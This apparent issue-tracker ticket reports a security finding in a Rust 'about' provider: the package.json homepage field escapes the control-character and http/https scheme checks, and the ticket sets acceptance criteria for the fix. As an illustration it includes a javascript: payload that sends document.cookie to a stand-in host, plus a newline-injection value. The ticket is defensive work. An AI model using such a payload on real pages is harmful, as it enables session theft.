---
id: TASK-2222
title: 'SEC-11: about-node''s package.json homepage bypasses the control-char drop and http(s) scheme allowlist that repository gets'
status: Done
assignee: []
created_date: '2026-09-08 07:21'
updated_date: '2026-09-08 20:00'
labels:
  - code-review-rust
  - security
dependencies: []
parent_task_id: 'TASK-2236'
modified_files:
  - extensions-node/about/src/package_json.rs
priority: high
ordinal: 129000
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
**File**: `extensions-node/about/src/package_json.rs:133`

**What**: In `parse_package_json`, the `repository` field is routed through
`repo_url::normalize_repo_url`, which drops the value when it contains a
control byte (SEC-2 / TASK-1165) or when its scheme is not in the
`http`/`https` allowlist (SEC-11 / TASK-1722). The `homepage` field, taken
from the same untrusted `package.json`, gets neither check:

```rust
homepage: trim_nonempty(raw.homepage),
```

`trim_nonempty` only trims whitespace and drops empties. Nothing downstream
re-checks it: `ProjectIdentity.homepage` is rendered by
`crates/core/src/project_identity/card.rs:105` via `non_empty_clone`, so the
raw string reaches the About card, `ops about --json`, and every markdown /
HTML surface built from them.

Concretely, a `package.json` containing

```json
{ "name": "x", "homepage": "javascript:fetch('https://evil.tld/?c='+document.cookie)" }
```

or `"homepage": "https://demo.dev\nINJECT"` surfaces verbatim.

The sibling about-python provider already applies **both** policies to
homepage and repository (`extensions-python/about/src/lib.rs:441` `pick_url`,
SEC-2 / TASK-1207 and SEC-11 / TASK-1755) and its own comments name
`extensions-node/about` as the crate the policy was copied from — the node
crate never got the homepage half.

**Why it matters**: `package.json` is attacker-controllable input whenever
`ops about` is run inside a cloned or vendored repository. A `javascript:` /
`data:` / `file:` homepage rendered as a hyperlink is a live XSS / local
resource disclosure sink in any consumer of `ops about --json` or the
generated markdown; an embedded newline forges an extra line in the card and
in log records. This is the same threat model the crate already accepted and
fixed for `repository`, left open on the adjacent field.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 homepage from package.json is dropped (rendered as missing, not stripped) when it contains any control character
- [ ] #2 homepage is dropped when its scheme is not in the shared http/https allowlist (ops_about::text_util::has_allowed_url_scheme)
- [ ] #3 the control-char and scheme policies are applied via the shared ops_about::text_util helpers, not a second local copy
- [ ] #4 tests cover javascript:, data:, file:, and embedded-LF homepage values reaching ProjectIdentity.homepage as None
<!-- AC:END -->
